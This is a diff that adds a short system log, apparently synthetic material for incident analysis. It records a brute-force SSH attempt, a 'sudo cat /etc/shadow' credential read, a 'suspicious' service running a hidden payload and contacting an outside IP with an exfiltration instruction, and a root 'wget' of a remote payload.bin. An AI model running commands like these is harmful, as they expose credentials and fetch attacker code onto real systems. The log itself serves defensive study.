@@ -1,0 +1,36 @@
+2025-12-08 03:12:14 INFO  systemd[1]: Started User Manager for UID 1001.
+2025-12-08 03:12:15 INFO  sshd[9821]: Accepted password for alishba from 192.168.1.44 port 50922 ssh2
+2025-12-08 03:12:15 INFO  sshd[9821]: pam_unix(sshd:session): session opened for user alishba by (uid=0)
+
+2025-12-08 03:14:02 WARN  kernel: CPU0: High interrupt rate detected from process chrome( PID 2338 )
+2025-12-08 03:14:08 INFO  sudo[10433]:   alishba : TTY=pts/0 ; PWD=/home/alishba ; COMMAND=/usr/bin/cat /etc/shadow
+2025-12-08 03:14:09 ALERT auth: Unauthorized attempt to access /etc/shadow blocked
+
+2025-12-08 03:15:44 INFO  cron[511]: (root) CMD (/usr/local/bin/backup.sh)
+2025-12-08 03:15:44 INFO  backup.sh[10244]: Backup started: target=/mnt/backup/server01/
+2025-12-08 03:15:47 INFO  backup.sh[10244]: Completed successfully
+
+2025-12-08 03:18:21 ERROR kernel: EXT4-fs error (device sda2): ext4_find_entry:1459: inode #421068: comm python3: reading directory lblock 0
+2025-12-08 03:18:22 WARN  systemd[1]: Failed to start suspicious.service
+
+2025-12-08 03:19:10 INFO  sshd[11022]: Failed password for invalid user admin from 185.221.102.77 port 44801 ssh2
+2025-12-08 03:19:12 INFO  sshd[11022]: Failed password for invalid user admin from 185.221.102.77 port 44801 ssh2
+2025-12-08 03:19:15 WARN  sshd[11022]: Possible brute-force attempt detected from 185.221.102.77
+
+2025-12-08 03:20:54 INFO  systemd[1]: Started suspicious.service
+2025-12-08 03:20:54 INFO  suspicious[11102]: Executing payload from /tmp/.cache/.sys_update
+2025-12-08 03:20:54 INFO  suspicious[11102]: Connection initiated -> 45.142.112.8:8080
+2025-12-08 03:20:55 WARN  suspicious[11102]: Received unexpected instruction: CMD_EXFIL
+
+2025-12-08 03:21:10 WARN  kernel: process suspicious(11102) attempted to access memory region 0x7fffde1000 without permission
+2025-12-08 03:21:11 ALERT systemd[1]: suspicious.service: Main process exited, code=killed, status=9/KILL
+2025-12-08 03:21:11 INFO  systemd[1]: suspicious.service: Unit entered failed state.
+
+2025-12-08 03:22:03 INFO  audit[11244]: USER_LOGIN pid=11244 uid=0 auid=1001 msg='op=login acct="root" exe="/usr/bin/su" res=success'
+2025-12-08 03:22:04 WARN  audit[11244]: USER_CMD pid=11244 uid=0 msg='cmd="/usr/bin/wget http://45.142.112.8/payload.bin"'
+
+2025-12-08 03:23:14 INFO  kernel: eth0: Link is Down
+2025-12-08 03:23:18 INFO  kernel: eth0: Link is Up - 1Gbps Full Duplex
+
+2025-12-08 03:23:55 INFO  sshd[11500]: Received disconnect from 192.168.1.44: 11: disconnected by user
+2025-12-08 03:23:55 INFO  sshd[11500]: pam_unix(sshd:session): session closed for user alishba
